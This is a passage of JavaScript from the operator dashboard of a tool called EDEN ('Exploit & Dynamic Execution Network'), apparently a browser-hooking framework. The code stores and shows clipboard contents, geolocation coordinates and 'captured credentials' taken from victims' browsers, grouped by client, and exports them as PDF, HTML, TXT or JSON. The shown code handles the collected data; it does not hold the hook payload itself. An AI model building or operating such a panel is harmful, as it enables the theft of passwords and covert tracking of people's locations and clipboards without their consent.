                const isDuplicate = this.data[clientId].some(entry => entry.content === content);
                if (isDuplicate) {
                    console.log('Skipping duplicate clipboard content for client', clientId);
                    return;
                }
                
                // Store the last added timestamp to prevent rapid duplicate additions
                if (!this.lastAddedTime) this.lastAddedTime = {};
                const now = Date.now();
                const lastTime = this.lastAddedTime[clientId] || 0;
                
                // If the same client is adding content too quickly (within 2 seconds), skip it
                if (now - lastTime < 2000) {
                    console.log('Skipping too frequent clipboard content from client', clientId);
                    return;
                }
                
                // Update the last added time for this client
                this.lastAddedTime[clientId] = now;
                
                // Add new entry with timestamp at the end to maintain chronological order
                this.data[clientId].push({
                    content: content,
                    timestamp: now
                });
                
                // Save to localStorage
                this.save();
                
                // Update UI
                this.renderHistory();
            },
            
            // Delete specific entry
            deleteEntry: function(clientId, index) {
                if (!this.data[clientId] || !this.data[clientId][index]) return;
                
                // Remove entry
                this.data[clientId].splice(index, 1);
                
                // Remove client if no entries left
                if (this.data[clientId].length === 0) {
                    delete this.data[clientId];
                }
                
                // Save to localStorage
                this.save();
                
                // Update UI
                this.renderHistory();
            },
            
            // Delete all entries for a client
            deleteClientEntries: function(clientId) {
                if (!this.data[clientId]) return;
                
                // Remove client data
                delete this.data[clientId];
                
                // Save to localStorage
                this.save();
                
                // Update UI
                this.renderHistory();
            },
            
            // Clear all history
            clearAll: function() {
                this.data = {};
                this.save();
                this.renderHistory();
            },
            
            // Save to localStorage
            save: function() {
                try {
                    localStorage.setItem('clipboardHistory', JSON.stringify(this.data));
                } catch (e) {
                    console.error('Error saving clipboard history:', e);
                }
            },
            
            // Render clipboard history to UI
            renderHistory: function() {
                const container = document.getElementById('clipboardHistory');
                if (!container) return;
                
                // Clear container
                container.innerHTML = '';
                
                // Check if we have any history
                if (Object.keys(this.data).length === 0) {
                    container.innerHTML = `
                        <div style="text-align: center; padding: 20px; background: #f8f9fa; border-radius: 8px;">
                            <i class="fas fa-clipboard" style="font-size: 2rem; color: #aaa; margin-bottom: 10px;"></i>
                            <p>No clipboard history yet</p>
                        </div>
                    `;
                    return;
                }
                
                // Sort clients by oldest entry first
                const sortedClients = Object.keys(this.data).sort((a, b) => {
                    const aOldest = this.data[a].length > 0 ? 
                        Math.min(...this.data[a].map(entry => entry.timestamp)) : Infinity;
                    const bOldest = this.data[b].length > 0 ? 
                        Math.min(...this.data[b].map(entry => entry.timestamp)) : Infinity;
                    return aOldest - bOldest;
                });
                
                // Create client containers
                sortedClients.forEach(clientId => {
                    // Skip if no entries
                    if (!this.data[clientId] || this.data[clientId].length === 0) return;
                    
                    // Get nickname if available
                    let nickname = clientId;
                    
                    // First check if we have a stored displayName for this client
                    if (this.data[clientId].displayName) {
                        nickname = this.data[clientId].displayName;
                    } 
                    // If not, try to find in clients object
                    else {
                        for (const key in clients) {
                            if (clients[key].clientId === clientId && clients[key].nickname) {
                                nickname = clients[key].nickname;
                                break;
                            }
                        }
                        
                        // If still not found, try with shortened ID
                        if (nickname === clientId && clientId.includes('_')) {
                            const shortId = clientId.split('_').pop().substring(0, 8);
                            for (const key in clients) {
                                if (clients[key].clientId && 
                                    clients[key].clientId.includes(shortId) && 
                                    clients[key].nickname) {
                                    nickname = clients[key].nickname;
                                    break;
                                }
                            }
                        }
                    }
                    
                    // Create client container
                    const clientContainer = document.createElement('div');
                    clientContainer.className = 'clipboard-client-container';
                    
                    // Create header
                    const header = document.createElement('div');
                    header.className = 'clipboard-client-header';
                    header.innerHTML = `
                        <div>Client: ${nickname}</div>
                        <div>
                            <button class="clipboard-btn" onclick="clipboardHistory.deleteClientEntries('${clientId}')">
                                <i class="fas fa-trash"></i> Clear
                            </button>
                        </div>
                    `;
                    clientContainer.appendChild(header);
                    
                    // Create entries container
                    const entriesContainer = document.createElement('div');
                    entriesContainer.className = 'clipboard-entries';
                    
                    // Add entries in chronological order (oldest first)
                    this.data[clientId].forEach((entry, idx) => {
                        const entryElement = document.createElement('div');
                        entryElement.className = 'clipboard-entry';
                        entryElement.dataset.index = idx;
                        
                        // Format date
                        const date = new Date(entry.timestamp);
                        const formattedDate = `${date.toLocaleDateString()} ${date.toLocaleTimeString()}`;
                        
                        // Create header
                        const entryHeader = document.createElement('div');
                        entryHeader.className = 'clipboard-entry-header';
                        entryHeader.innerHTML = `
                            <div>
                                <span class="clipboard-entry-number">${idx + 1}</span>
                                <span class="clipboard-entry-time">${formattedDate}</span>
                            </div>
                            <div class="clipboard-entry-actions">
                                <button class="clipboard-btn clipboard-btn-delete" 
                                        onclick="event.stopPropagation(); clipboardHistory.deleteEntry('${clientId}', ${idx})">
                                    <i class="fas fa-times"></i> Delete
                                </button>
                            </div>
                        `;
                        
                        // Toggle content display on click
                        entryHeader.addEventListener('click', function() {
                            entryElement.classList.toggle('expanded');
                        });
                        
                        // Create content
                        const entryContent = document.createElement('div');
                        entryContent.className = 'clipboard-entry-content';
                        entryContent.textContent = entry.content;
                        
                        // Add to entry
                        entryElement.appendChild(entryHeader);
                        entryElement.appendChild(entryContent);
                        
                        // Add to entries container
                        entriesContainer.appendChild(entryElement);
                    });
                    
                    // Add entries to client container
                    clientContainer.appendChild(entriesContainer);
                    
                    // Add to main container
                    container.appendChild(clientContainer);
                });
            }
        };
        
        // Function to clear all clipboard history
        function clearClipboardHistory() {
            if (confirm('Are you sure you want to clear all clipboard history?')) {
                clipboardHistory.clearAll();
            }
        }
        
        // Export clipboard history as PDF
function exportClipboardAsPdf(clipboardData) {
    // We'll need to load the jsPDF library
    const script = document.createElement('script');
    script.src = 'https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js';
    script.onload = function() {
        const script2 = document.createElement('script');
        script2.src = 'https://cdnjs.cloudflare.com/ajax/libs/jspdf-autotable/3.5.28/jspdf.plugin.autotable.min.js';
        script2.onload = generatePDF;
        document.head.appendChild(script2);
    };
    document.head.appendChild(script);
    
    function generatePDF() {
        try {
            const { jsPDF } = window.jspdf;
            const doc = new jsPDF();
            
            // Title
            doc.setFontSize(16);
            doc.text("Eden Clipboard History Export", 14, 15);
            
            // Add timestamp
            const timestamp = new Date().toLocaleString();
            doc.setFontSize(10);
            doc.text(`Generated: ${timestamp}`, 14, 22);
            
            // Loop through each client's clipboard data
            let yPos = 30;
            
            Object.keys(clipboardData).forEach(clientId => {
                const clientData = clipboardData[clientId];
                const displayName = clientData.displayName || clientId;
                
                // Check if we need a new page
                if (yPos > 250) {
                    doc.addPage();
                    yPos = 20;
                }
                
                // Add client header
                doc.setFontSize(12);
                doc.setTextColor(44, 62, 80);
                doc.text(`Client: ${displayName}`, 14, yPos);
                yPos += 10;
                
                // Process each entry
                if (Array.isArray(clientData)) {
                    clientData.forEach((entry, index) => {
                        // Check if we need a new page
                        if (yPos > 270) {
                            doc.addPage();
                            yPos = 20;
                        }
                        
                        if (entry.timestamp && entry.content) {
                            const timestamp = new Date(entry.timestamp).toLocaleString();
                            
                            // Add timestamp
                            doc.setFontSize(10);
                            doc.setTextColor(100, 100, 100);
                            doc.text(`${timestamp}:`, 14, yPos);
                            yPos += 5;
                            
                            // Add content
                            doc.setTextColor(0, 0, 0);
                            
                            // Split long content into lines
                            const contentLines = doc.splitTextToSize(entry.content, 180);
                            doc.text(contentLines, 14, yPos);
                            yPos += contentLines.length * 5 + 10;
                            
                            // Add separator
                            doc.setDrawColor(200, 200, 200);
                            doc.line(14, yPos - 5, 196, yPos - 5);
                            yPos += 5;
                        }
                    });
                } else {
                    // Handle case where entries are stored differently
                    const entries = clientData.filter(item => item !== 'displayName');
                    entries.forEach((entry, index) => {
                        // Check if we need a new page
                        if (yPos > 270) {
                            doc.addPage();
                            yPos = 20;
                        }
                        
                        if (entry.timestamp && entry.content) {
                            const timestamp = new Date(entry.timestamp).toLocaleString();
                            
                            // Add timestamp
                            doc.setFontSize(10);
                            doc.setTextColor(100, 100, 100);
                            doc.text(`${timestamp}:`, 14, yPos);
                            yPos += 5;
                            
                            // Add content
                            doc.setTextColor(0, 0, 0);
                            
                            // Split long content into lines
                            const contentLines = doc.splitTextToSize(entry.content, 180);
                            doc.text(contentLines, 14, yPos);
                            yPos += contentLines.length * 5 + 10;
                            
                            // Add separator
                            doc.setDrawColor(200, 200, 200);
                            doc.line(14, yPos - 5, 196, yPos - 5);
                            yPos += 5;
                        }
                    });
                }
                
                yPos += 10;
            });
            
            // Save the PDF
            const fileName = `eden_clipboard.pdf`;
            doc.save(fileName);
            
        } catch (error) {
            console.error('Error generating PDF:', error);
            alert('Failed to generate PDF: ' + error.message);
        }
    }
}
        
        // Export clipboard history as HTML
        function exportClipboardAsHtml(clipboardData) {
            const html = generateClipboardHtml(clipboardData);
            const blob = new Blob([html], { type: 'text/html' });
            const url = URL.createObjectURL(blob);
            
            const downloadLink = document.createElement('a');
            downloadLink.href = url;
            downloadLink.download = `eden_clipboard.html`;
            
            document.body.appendChild(downloadLink);
            downloadLink.click();
            document.body.removeChild(downloadLink);
            
            setTimeout(() => {
                URL.revokeObjectURL(url);
            }, 100);
            
            
        }
        
        // Export clipboard history as TXT
        function exportClipboardAsTxt(clipboardData) {
            let txtContent = "EDEN CLIPBOARD HISTORY\n";
            txtContent += "Generated: " + new Date().toLocaleString() + "\n\n";
            
            // Process each client's clipboard data
            Object.keys(clipboardData).forEach(clientId => {
                const clientData = clipboardData[clientId];
                const displayName = clientData.displayName || clientId;
                
                txtContent += "===================================\n";
                txtContent += `CLIENT: ${displayName}\n`;
                txtContent += "===================================\n\n";
                
                // Process each entry
                if (Array.isArray(clientData)) {
                    clientData.forEach((entry, index) => {
                        const timestamp = new Date(entry.timestamp).toLocaleString();
                        txtContent += `[${timestamp}]\n`;
                        txtContent += "-----------------------------------\n";
                        txtContent += entry.content + "\n\n";
                    });
                } else {
                    // Handle case where entries are stored differently
                    const entries = clientData.filter(item => item !== 'displayName');
                    entries.forEach((entry, index) => {
                        if (entry.timestamp && entry.content) {
                            const timestamp = new Date(entry.timestamp).toLocaleString();
                            txtContent += `[${timestamp}]\n`;
                            txtContent += "-----------------------------------\n";
                            txtContent += entry.content + "\n\n";
                        }
                    });
                }
                
                txtContent += "\n\n";
            });
            
            const blob = new Blob([txtContent], { type: 'text/plain' });
            const url = URL.createObjectURL(blob);
            
            const downloadLink = document.createElement('a');
            downloadLink.href = url;
            downloadLink.download = `eden_clipboard.txt`;
            
            document.body.appendChild(downloadLink);
            downloadLink.click();
            document.body.removeChild(downloadLink);
            
            setTimeout(() => {
                URL.revokeObjectURL(url);
            }, 100);
            
            
        }
        
        // Export clipboard history as JSON
        function exportClipboardAsJson(clipboardData) {
            // Create a formatted version of the data
            const exportData = {};
            
            Object.keys(clipboardData).forEach(clientId => {
                const clientData = clipboardData[clientId];
                exportData[clientId] = {
                    displayName: clientData.displayName || clientId,
                    entries: []
                };
                
                // Process entries
                if (Array.isArray(clientData)) {
                    clientData.forEach(entry => {
                        if (entry.timestamp && entry.content) {
                            exportData[clientId].entries.push({
                                content: entry.content,
                                timestamp: entry.timestamp,
                                formattedTimestamp: new Date(entry.timestamp).toLocaleString()
                            });
                        }
                    });
                }
            });
            
            // Create JSON file
            const jsonStr = JSON.stringify(exportData, null, 2);
            const blob = new Blob([jsonStr], { type: 'application/json' });
            const url = URL.createObjectURL(blob);
            
            // Create download link
            const downloadLink = document.createElement('a');
            downloadLink.href = url;
            downloadLink.download = `eden_clipboard.json`;
            
            // Trigger download
            document.body.appendChild(downloadLink);
            downloadLink.click();
            document.body.removeChild(downloadLink);
            
            // Clean up URL
            setTimeout(() => {
                URL.revokeObjectURL(url);
            }, 100);
            
            // Show success message
            
        }
        
        // Generate HTML for clipboard export
        function generateClipboardHtml(clipboardData) {
            // Create HTML document
            let html = `<!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>EDEN Clipboard History Export</title>
        <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
        <style>
            :root {
                --primary: #0066ff;
                --primary-light: #4d94ff;
                --secondary: #003380;
                --accent: #00ccff;
                --border: #99c2ff;
                --gray-50: #f9fafb;
                --gray-100: #f3f4f6;
                --gray-200: #e5e7eb;
                --gray-500: #6b7280;
                --gray-700: #374151;
                --gray-800: #1f2937;
            }
            
            * {margin: 0; padding: 0; box-sizing: border-box;}
            
            body {
                font-family: 'Poppins', sans-serif;
                line-height: 1.6;
                color: var(--gray-800);
                background: linear-gradient(135deg, #f1f5f9 0%, #e2e8f0 100%);
                margin: 0;
                padding: 0;
                overflow-x: hidden;
                width: 100%;
            }
            
            .container {max-width: 1200px; margin: 0 auto; padding: 2rem;}
            
            /* Header */
            .header {
                background: linear-gradient(135deg, var(--primary) 0%, var(--accent) 100%);
                color: white;
                padding: 40px 0;
                position: relative;
                overflow: hidden;
                box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
                border-bottom: 1px solid gold;
            }
            
            .header::before {
                content: '';
                position: absolute;
                top: 0; left: 0; right: 0; bottom: 0;
                background: url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTQ0MCIgaGVpZ2h0PSI0MDAiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PGRlZnM+PGxpbmVhckdyYWRpZW50IHgxPSIwJSIgeTE9IjAlIiB4Mj0iMTAwJSIgeTI9IjEwMCUiIGlkPSJhIj48c3RvcCBzdG9wLWNvbG9yPSIjRkZGIiBzdG9wLW9wYWNpdHk9Ii4wNSIgb2Zmc2V0PSIwJSIvPjxzdG9wIHN0b3AtY29sb3I9IiNGRkYiIHN0b3Atb3BhY2l0eT0iLjEiIG9mZnNldD0iMTAwJSIvPjwvbGluZWFyR3JhZGllbnQ+PC9kZWZzPjxwYXRoIGQ9Ik0wIDQwMFYyMDBzMTAwLTUwIDIwMC01MHMxMDAgNTAgMjAwIDUwIDEwMC01MCAyMDAtNTAgMTAwIDUwIDIwMCA1MCAxMDAtNTAgMjAwLTUwIDEwMCA1MCAyMDAgNTAgMTAwLTUwIDIwMC01MHYyMDBIMHoiIGZpbGw9InVybCgjYSkiIGZpbGwtcnVsZT0iZXZlbm9kZCIgZmlsbC1vcGFjaXR5PSIuNCIvPjwvc3ZnPg==') bottom center no-repeat;
                background-size: cover;
                opacity: 0.3;
                z-index: 0;
            }
            
            .header-content {
                max-width: 1200px;
                margin: 0 auto;
                padding: 0 30px;
                position: relative;
                z-index: 1;
                display: flex;
                justify-content: center;
            }
            
            .header-left {
                display: flex;
                flex-direction: column;
                align-items: center;
                text-align: center;
            }
            
            .logo-text h1 {
                font-size: 36px;
                font-weight: 700;
                margin: 0;
                letter-spacing: 1px;
                text-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            }
            
            .logo-text .tagline {
                font-size: 18px;
                opacity: 0.9;
                font-weight: 400;
                margin-top: 5px;
            }
            
            .header-subtitle {
                font-size: 1.2rem;
                margin-top: 15px;
                font-weight: 500;
            }
            
            .timestamp {
                display: inline-block;
                background-color: rgba(255, 255, 255, 0.2);
                padding: 8px 15px;
                border-radius: 50px;
                font-size: 14px;
                font-weight: 500;
                margin-top: 20px;
                backdrop-filter: blur(5px);
            }
            
            /* Clipboard Content */
            .client-container {
                background-color: white;
                border-radius: 16px;
                box-shadow: 0 5px 15px rgba(0, 26, 64, 0.1);
                padding: 0;
                margin-bottom: 30px;
                border: 1px solid var(--border);
                overflow: hidden;
                transition: all 0.3s ease;
            }
            
            .client-container:hover {
                transform: translateY(-5px);
                box-shadow: 0 10px 20px rgba(0, 26, 64, 0.15);
            }
            
            .client-header {
                margin-bottom: 0;
                position: relative;
                padding: 20px 30px;
                border-bottom: 2px solid var(--primary-light);
                background-color: var(--gray-50);
                color: var(--secondary);
                font-weight: 600;
                font-size: 20px;
            }
            
            .clipboard-entry {
                border-bottom: 1px solid var(--gray-200);
                padding: 20px 30px;
            }
            
            .clipboard-entry:last-child {
                border-bottom: none;
            }
            
            .entry-header {
                color: var(--gray-500);
                font-size: 14px;
                margin-bottom: 12px;
                font-weight: 500;
            }
            
            .entry-content {
                white-space: pre-wrap;
                word-break: break-word;
                background-color: var(--gray-50);
                padding: 15px;
                border-radius: 8px;
                font-family: 'Courier New', monospace;
                border: 1px solid var(--gray-200);
                font-size: 14px;
                line-height: 1.5;
            }
            
            /* Author & Footer */
            .author-info {
                display: flex;
                flex-direction: column;
                align-items: center;
                margin-top: 10px;
            }
            
            .author-details {text-align: center;}
            
            .author-name {
                font-size: 24px;
                font-weight: 600;
                margin-bottom: 5px;
                color: var(--secondary);
            }
            
            .author-role {
                font-size: 18px;
                color: var(--primary);
                margin-bottom: 15px;
            }
            
            .social-links {
                display: flex;
                gap: 15px;
                margin-top: 10px;
                justify-content: center;
            }
            
            .social-link {
                width: 40px;
                height: 40px;
                border-radius: 50%;
                background-color: var(--primary-light);
                color: white;
                display: flex;
                align-items: center;
                justify-content: center;
                font-size: 18px;
                transition: all 0.3s ease;
                text-decoration: none;
            }
            
            .social-link:hover {
                background-color: white;
                color: var(--primary);
                transform: translateY(-3px);
            }
            
            .footer-container {
                background-color: white;
                color: var(--gray-800);
                padding: 15px 0;
                border-top: 1px solid var(--gray-200);
                width: 100%;
                box-shadow: 0 -5px 15px rgba(0, 0, 0, 0.05);
                left: 0;
                right: 0;
                position: relative;
            }
            
            .footer-content {
                display: flex;
                flex-direction: column;
                justify-content: center;
                align-items: center;
                gap: 10px;
                max-width: 1200px;
                margin: 0 auto;
                padding: 0 20px;
            }
            
            .footer-text {
                text-align: center;
                font-size: 18px;
                color: var(--secondary);
            }
            
            .copyright {
                text-align: center;
                padding-top: 10px;
                margin-top: 10px;
                border-top: 1px solid var(--gray-200);
                color: var(--gray-500);
                font-size: 14px;
                width: 100%;
            }
            
            /* Responsive */
            @media (max-width: 768px) {
                .container {padding: 1rem;}
                .header-content {padding: 0 15px;}
                .logo-text h1 {font-size: 28px;}
                .client-header {padding: 15px 20px;}
                .clipboard-entry {padding: 15px 20px;}
            }
            
            @media print {
                body {background-color: white;}
                .client-container {
                    box-shadow: none;
                    margin-bottom: 30px;
                    page-break-inside: avoid;
                }
                .header {background: var(--primary) !important; -webkit-print-color-adjust: exact; print-color-adjust: exact;}
                .footer-container {background: white !important; -webkit-print-color-adjust: exact; print-color-adjust: exact;}
            }
        </style>
    </head>
    <body>
        <header class="header">
            <div class="header-content">
                <div class="header-left">
                    <div class="logo-text">
                        <h1>EDEN</h1>
                        <div class="tagline">Exploit & Dynamic Execution Network</div>
                    </div>
                    <div class="header-subtitle">Clipboard History Export</div>
                    <span class="timestamp">Generated: ${new Date().toLocaleString()}</span>
                </div>
            </div>
        </header>
        
        <div class="container">`;
            
            // Process each client
            Object.keys(clipboardData).forEach(clientId => {
                const clientData = clipboardData[clientId];
                const displayName = clientData.displayName || clientId;
                
                html += `
            <div class="client-container">
                <div class="client-header">${displayName}</div>`;
                
                // Process entries
                if (Array.isArray(clientData)) {
                    clientData.forEach(entry => {
                        if (entry.timestamp && entry.content) {
                            const timestamp = new Date(entry.timestamp).toLocaleString();
                            html += `
                <div class="clipboard-entry">
                    <div class="entry-header">Captured: ${timestamp}</div>
                    <div class="entry-content">${entry.content}</div>
                </div>`;
                        }
                    });
                }
                
                html += `
            </div>`;
            });
            
            html += `
        </div>
        
        <div class="footer-container">
            <div class="footer-content">
                <div class="footer-text">
                    <p>Exported from EDEN</p>
                </div>
                <div class="author-info">
                    <div class="author-details">
                        <div class="author-name">Varun</div>
                        <div class="author-role">Red Teamer | Web Penetration Tester | Ethical Hacker</div>
                        <div class="social-links">
                            <a href="https://www.linkedin.com/in/varun-‎-775a77310" target="_blank" class="social-link" title="LinkedIn">
                                <i class="fab fa-linkedin-in"></i>
                            </a>
                            <a href="https://github.com/mr-pentest" target="_blank" class="social-link" title="GitHub">
                                <i class="fab fa-github"></i>
                            </a>
                            <a href="#" class="social-link" title="Twitter">
                                <i class="fab fa-twitter"></i>
                            </a>
                            <a href="#" class="social-link" title="Discord">
                                <i class="fab fa-discord"></i>
                            </a>
                            <a href="#" class="social-link" title="Instagram">
                                <i class="fab fa-instagram"></i>
                            </a>
                        </div>
                    </div>
                </div>
                <div class="copyright">
                    <p>© ${new Date().getFullYear()} EDEN Security | Developed by Varun</p>
                </div>
            </div>
        </div>
    </body>
    </html>`;
            
            return html;
        }
        
        // Export all clipboard history
        function exportClipboardHistory() {
            // Get clipboard data
            const clipboardData = clipboardHistory.data;
            
            if (Object.keys(clipboardData).length === 0) {
                alert('No clipboard history to export');
                return;
            }
            
            try {
                // Get selected format
                const formatSelect = document.getElementById('clipboardExportFormatSelect');
                const format = formatSelect ? formatSelect.value : 'json';
                
                // Export in the selected format
                switch(format) {
                    case 'pdf':
                        exportClipboardAsPdf(clipboardData);
                        break;
                    case 'html':
                        exportClipboardAsHtml(clipboardData);
                        break;
                    case 'txt':
                        exportClipboardAsTxt(clipboardData);
                        break;
                    case 'json':
                    default:
                        exportClipboardAsJson(clipboardData);
                        break;
                }
            } catch (error) {
                console.error('Error exporting clipboard history:', error);
                alert('Failed to export clipboard history: ' + error.message);
            }
        }
        
        // Location history management
        const locationHistory = {
            // Store location data by client
            data: {},
            
            // Initialize from localStorage
            init: function() {
                try {
                    const savedData = localStorage.getItem('locationHistory');
                    if (savedData) {
                        this.data = JSON.parse(savedData);
                    }
                } catch (e) {
                    console.error('Error loading location history:', e);
                    this.data = {};
                }
            },
            
            // Add a new location entry
            add: function(clientId, locationData) {
                // Initialize client array if needed
                if (!this.data[clientId]) {
                    this.data[clientId] = [];
                }
                
                // Add new entry (newest first)
                this.data[clientId].unshift(locationData);
                
                // Limit to 10 entries per client
                if (this.data[clientId].length > 10) {
                    this.data[clientId] = this.data[clientId].slice(0, 10);
                }
                
                // Save to localStorage
                this.save();
                
                // Update UI
                this.renderHistory();
            },
            
            // Remove entries for a specific client
            removeClient: function(clientId) {
                if (this.data[clientId]) {
                    delete this.data[clientId];
                    this.save();
                    this.renderHistory();
                    return true;
                }
                return false;
            },
            
            // Remove a specific entry
            removeEntry: function(clientId, index) {
                if (this.data[clientId] && this.data[clientId][index]) {
                    this.data[clientId].splice(index, 1);
                    
                    // Remove client if no entries left
                    if (this.data[clientId].length === 0) {
                        delete this.data[clientId];
                    }
                    
                    this.save();
                    this.renderHistory();
                    return true;
                }
                return false;
            },
            
            // Clear all history
            clearAll: function() {
                this.data = {};
                this.save();
                this.renderHistory();
            },
            
            // Save to localStorage
            save: function() {
                try {
                    localStorage.setItem('locationHistory', JSON.stringify(this.data));
                } catch (e) {
                    console.error('Error saving location history:', e);
                }
            },
            
            // Render location history to UI
            renderHistory: function() {
                const container = document.getElementById('locationHistory');
                if (!container) return;
                
                // Clear container
                container.innerHTML = '';
                
                // Check if we have any history
                if (Object.keys(this.data).length === 0) {
                    container.innerHTML = `
                        <div style="text-align: center; padding: 20px; background: #f8f9fa; border-radius: 8px;">
                            <i class="fas fa-map-marker-alt" style="font-size: 2rem; color: #aaa; margin-bottom: 10px;"></i>
                            <p>No location history yet</p>
                        </div>
                    `;
                    return;
                }
                
                // Sort clients by oldest entry first
                const sortedClients = Object.keys(this.data).sort((a, b) => {
                    const aOldest = this.data[a].length > 0 ? 
                        Math.min(...this.data[a].map(entry => new Date(entry.timestamp).getTime())) : Infinity;
                    const bOldest = this.data[b].length > 0 ? 
                        Math.min(...this.data[b].map(entry => new Date(entry.timestamp).getTime())) : Infinity;
                    return aOldest - bOldest;
                });
                
                // Create client containers
                sortedClients.forEach(clientId => {
                    // Skip if no entries
                    if (!this.data[clientId] || this.data[clientId].length === 0) return;
                    
                    // Get display name (nickname) if available
                    let displayName = clientId;
                    
                    // First check if we have a stored displayName for this client
                    if (this.data[clientId][0] && this.data[clientId][0].displayName) {
                        displayName = this.data[clientId][0].displayName;
                    } 
                    // If not, try to find in clients object
                    else {
                        for (const key in clients) {
                            if (clients[key].clientId === clientId && clients[key].nickname) {
                                displayName = clients[key].nickname;
                                break;
                            }
                        }
                        
                        // If still not found, try with shortened ID
                        if (displayName === clientId && clientId.includes('_')) {
                            const shortId = clientId.split('_').pop().substring(0, 8);
                            for (const key in clients) {
                                if (clients[key].clientId && 
                                    clients[key].clientId.includes(shortId) && 
                                    clients[key].nickname) {
                                    displayName = clients[key].nickname;
                                    break;
                                }
                            }
                        }
                    }
                    
                    // Create client container
                    const clientContainer = document.createElement('div');
                    clientContainer.className = 'location-client-container';
                    clientContainer.style.border = '1px solid #ddd';
                    clientContainer.style.borderRadius = '8px';
                    clientContainer.style.marginBottom = '20px';
                    clientContainer.style.overflow = 'hidden';
                    
                    // Create header
                    const header = document.createElement('div');
                    header.className = 'location-client-header';
                    header.style.padding = '15px';
                    header.style.backgroundColor = '#f1f5f9';
                    header.style.display = 'flex';
                    header.style.justifyContent = 'space-between';
                    header.style.alignItems = 'center';
                    header.style.cursor = 'pointer';
                    header.innerHTML = `
                        <div style="font-weight: bold;">Client: ${displayName}</div>
                        <div>
                            <button class="location-btn" style="padding: 5px 10px; background: #dc3545; color: white; border: none; border-radius: 4px; cursor: pointer;" 
                                    onclick="event.stopPropagation(); locationHistory.removeClient('${clientId}')">
                                <i class="fas fa-trash"></i> Clear
                            </button>
                        </div>
                    `;
                    clientContainer.appendChild(header);
                    
                    // Create entries container
                    const entriesContainer = document.createElement('div');
                    entriesContainer.className = 'location-entries';
                    entriesContainer.style.maxHeight = '300px';
                    entriesContainer.style.overflowY = 'auto';
                    
                    // Add entries in chronological order (newest first)
                    this.data[clientId].forEach((entry, idx) => {
                        const entryElement = document.createElement('div');
                        entryElement.className = 'location-entry';
                        entryElement.style.padding = '15px';
                        entryElement.style.borderBottom = '1px solid #eee';
                        
                        // Format date
                        const date = new Date(entry.timestamp);
                        const formattedDate = `${date.toLocaleDateString()} ${date.toLocaleTimeString()}`;
                        
                        // Format coordinates
                        const lat = entry.coords.latitude;
                        const lng = entry.coords.longitude;
                        const accuracy = entry.coords.accuracy || 'Unknown';
                        const mapsUrl = `https://www.google.com/maps?q=${lat},${lng}`;
                        
                        // Add entry content
                        entryElement.innerHTML = `
                            <div style="display: flex; justify-content: space-between; margin-bottom: 10px;">
                                <div style="font-weight: bold;">#${idx + 1}</div>
                                <div style="color: #666; font-size: 0.9em;">${formattedDate}</div>
                                <button class="location-btn-delete" style="background: none; border: none; color: #dc3545; cursor: pointer;"
                                        onclick="locationHistory.removeEntry('${clientId}', ${idx})">
                                    <i class="fas fa-times"></i>
                                </button>
                            </div>
                            <div style="margin-bottom: 5px;"><b>Coordinates:</b> ${lat}, ${lng}</div>
                            <div style="margin-bottom: 5px;"><b>Accuracy:</b> ${accuracy} meters</div>
                            <div style="margin-top: 10px;">
                                <a href="${mapsUrl}" target="_blank" style="display: inline-block; padding: 5px 10px; background: #28a745; color: white; border-radius: 4px; text-decoration: none;">
                                    <i class="fas fa-map-marker-alt"></i> View on Google Maps
                                </a>
                            </div>
                        `;
                        
                        // Add to entries container
                        entriesContainer.appendChild(entryElement);
                    });
                    
                    // Add entries to client container
                    clientContainer.appendChild(entriesContainer);
                    
                    // Toggle expand/collapse on header click
                    header.addEventListener('click', function() {
                        const currentDisplay = entriesContainer.style.display;
                        entriesContainer.style.display = currentDisplay === 'none' ? 'block' : 'none';
                    });
                    
                    // Add to main container
                    container.appendChild(clientContainer);
                });
            }
        };
        
        // Function to add location to history
        function addLocationToHistory(clientId, locationData) {
            locationHistory.add(clientId, locationData);
        }
        
        // Function to clear all location history
        function clearAllLocationHistory() {
            if (confirm('Are you sure you want to clear all location history?')) {
                locationHistory.clearAll();
                showStatusMessage('success', 'All location history has been cleared');
            }
        }
        
        // Load clipboard and location history on page load
        document.addEventListener('DOMContentLoaded', function() {
            setTimeout(() => {
                clipboardHistory.renderHistory();
                locationHistory.init();
                locationHistory.renderHistory();
                // Update client display names to use nicknames for all containers
                updateClientDisplayNames();
            }, 500);
        });

        // Client selection listener removed
        
        // Load credentials from localStorage
        function loadStoredCredentials() {
            try {
                const storedCredentials = localStorage.getItem('eden_credentials');
                if (storedCredentials) {
                    capturedCredentials = JSON.parse(storedCredentials);
                    updateCredentialsUI();
                }
            } catch (error) {
                console.error('Error loading credentials:', error);
            }
        }
        
        // Save credentials to localStorage
        function saveCredentialsToStorage() {
            try {
                localStorage.setItem('eden_credentials', JSON.stringify(capturedCredentials));
            } catch (error) {
                console.error('Error saving credentials:', error);
            }
        }
        
        // Add credential data
        function addCredentials(credentialData) {
            // Skip empty form submissions (where all values are empty)
            if (credentialData.data) {
                let hasNonEmptyValue = false;
                for (const key in credentialData.data) {
                    if (credentialData.data[key] && credentialData.data[key].trim() !== '') {
                        hasNonEmptyValue = true;
                        break;
                    }
                }
                
                // Skip if all values are empty
                if (!hasNonEmptyValue) {
                    console.log('Skipping empty form submission');
                    return;
                }
                
                // Check form metadata for password fields
                if (credentialData.formMetadata && credentialData.formMetadata.hasPassword) {
                    console.log('Form contains password fields, ensuring capture');
                    hasNonEmptyValue = true;
                }
                
                // Check for duplicates (same data from same client within last 5 seconds)
                const now = new Date().getTime();
                const fiveSecondsAgo = now - 5000;
                
                // Check recent submissions
                const isDuplicate = capturedCredentials.some(cred => {
                    const credTime = new Date(cred.timestamp).getTime();
                    if (credTime < fiveSecondsAgo) return false; // Too old to be a duplicate
                    
                    // Same client?
                    if (cred.clientId !== credentialData.clientId) return false;
                    
                    // Similar data?
                    let sameDataCount = 0;
                    let totalFields = 0;
                    
                    for (const key in credentialData.data) {
                        totalFields++;
                        if (cred.data[key] === credentialData.data[key]) {
                            sameDataCount++;
                        }
                    }
                    
